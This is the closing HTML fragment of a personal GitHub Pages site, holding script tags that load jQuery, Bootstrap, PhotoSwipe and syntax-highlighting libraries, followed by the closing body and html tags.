<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script src="https://gi0cann.github.io/js/main.js"></script>
<script src="https://gi0cann.github.io/js/highlight.min.js"></script>
<script> hljs.initHighlightingOnLoad(); </script>
<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
<script src="https://gi0cann.github.io/js/load-photoswipe.js"></script>








  </body>
</html>

